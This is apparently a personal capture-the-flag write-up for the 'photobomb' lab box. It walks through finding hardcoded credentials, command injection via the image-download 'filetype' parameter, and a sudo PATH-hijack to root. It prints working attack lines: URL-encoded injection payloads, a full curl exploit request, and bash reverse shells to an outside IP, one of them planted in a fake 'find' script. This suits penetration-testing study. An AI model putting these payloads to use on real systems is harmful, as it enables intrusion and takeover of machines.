# photobomb

Not a lot going on with this box looking at it superficially. Ports 22 and 80 are open, and the webserver is pretty minimal.

Wfuzz finds a few resources, but they are all hidden behind basic authentication.

I tried bruteforcing the credentials with common usernames and passwords, but no luck.

When visiting an url that does not exist, one can see that the webserver framework is called Sinatra. Google tells me it's related to Ruby.

I also tried looking for exploits for this framework, but not a lot of data here, and also no luck.

# 404

In the process of revisiting everything again, I stumbled upon this source for the 404 page:

```
  <img src='http://127.0.0.1:4567/__sinatra__/404.png'>
```

And it's noticable since the image in the page does not load. I'm sure it worked on the developer's machine!

But it looks pretty suspect, right? The image does not load because localhost does not have a server running on port 4567 that serves the image 404.jpg. Localhost is me! Or whomever is visiting the website.

So that means if I host a webserver on port 4567 which serves a 404.jph image, it should appear, right?

Let's try. I setup a python server on the port and create the dir and file:

```
$ wget some-image-off-the-internet.png
$ mkdir __sinatra__
$ mv some-image-off-the-internet.png __sinatra__/404.png
$ python -m http.server 4567
```

And voila! The image appears on the 404 page. Now it's time to find out how this can give us some kind of foothold.

But I don't see how this can be exploited right off the bat. My first thought is that this will be limited to XSS, but localized to my computer since 127.0.0.1 refers to the website visitor's laptop. So even if someone else would visit the 404 page, they probably won't be hosting their own server and 404.png file with malicious content.

# New day, new hints

After cheating a bit, I checked out the source on the front page as well. Uses some custom javascript called photobomb.js:

```
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

Credentials are seemingly hardcoded, so let's try to log in with these.

Success! Looks like a service for downloading images in specific dimensions.

I took this to Burp to see what the request looked like:

```
photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg&dimensions=30x20
```

And this is the form data being sent. First off the bat, I tried changing the dimension to something arbitrary that was not an option in the web ui; like 32x32 to see if I still get an image to download. My initial thought is that maybe there is some kind of image manipulation behind that generates the dimensions.

And I did get an image and the dimensions were as I had specified. That seems to confirm that there is some ad-hoc image resizig going on.

I then tried to see if I could send an http request to my own server by using some kind of command injection for the dimensions parameter, but I was not successful.

I then tried the filetype parameter, and had more luck here. This payload was working:

```
photo=andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg&filetype=png%3b%20curl%20http%3a%2f%2f10.10.16.17%3a4444%2f&dimensions=30x30
```

Which is just `png; curl http://10.10.16.17:4444/` url encoded

I went on to try to craft a payload to give me a reverse shell and came up with this:

```
photo=andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg&filetype=png%3b%20curl%20http%3a%2f%2f10.10.16.17%3a4444%2f&dimensions=30x30
```

Which is just url encoded from:

```
png; bash -c 'bash -i >& /dev/tcp/10.10.16.17/4444 0>&1'
```

I just assumed it was running in bash behind the scenes and looks like I was right!


The whole request as a curl command:

```
curl -i -s -k -X $'POST' \
    -H $'Host: photobomb.htb' \
    -H $'Content-Length: 168' \
    -H $'Authorization: Basic cEgwdDA6YjBNYiE=' \
    -H $'Content-Type: application/x-www-form-urlencoded' \
    --data-binary $'photo=andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg&filetype=png%3b%20bash%20-c%20\'bash%20-i%20%3e%26%20%2fdev%2ftcp%2f10.10.16.17%2f4444%200%3e%261\'%20%23&dimensions=30x30' \
    $'http://photobomb.htb/printer'
```

# Privesc

We enter as user wizard, but aim to exit as root!

Possible vectors:

something about SETENV

If i can control environment variables, I can control PATH. If I can control PATH I can control binaries that are not called with absolute path.

find is one such case!

# Getting root

A few days have passed, but I have managed to root the box.

So the thinking was correct: if the `find` command is relative in the cleanup scrpit, we can definitely exploit it.

However, I spent a good amount of time trying to get it to work. This was the main idea for my approach:

- Create a new executable called `find` in `/tmp/nscp`
- Call the cleanup script with sudo and pass in a new PATH variable such that `/tmp/nscp/find` is found before `/usr/bin/find`

And the idea was good, but I could not get it to work!

I found out that the mistake I was doing was trying to set the PATH variable before the sudo command:

```
PATH=/tmp/nscp:$PATH sudo /opt/cleanup.sh
```

And this does not work with sudo. It works completely fine with normal commands I've used so far in my work life. Calling it this way, the command executes, but the PATH variable is not passed at all.

What DOES work is to put it after sudo:

```
sudo PATH=/tmp/nscp:$PATH /opt/cleanup.sh
```

Contents of /tmp/nscp/find:

```
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.16.17/5555 0>&1'
```

You can also just do

```
#!/bin/bash
bash
```

, I think.

# Conclusion

Really good box! I was somewhat stuck for the foothold and the final part of privesc. For foothold I did not consider looking at the page source for some time, and for the final part I did not properly understand the syntax for passing environment variables to sudo commands.
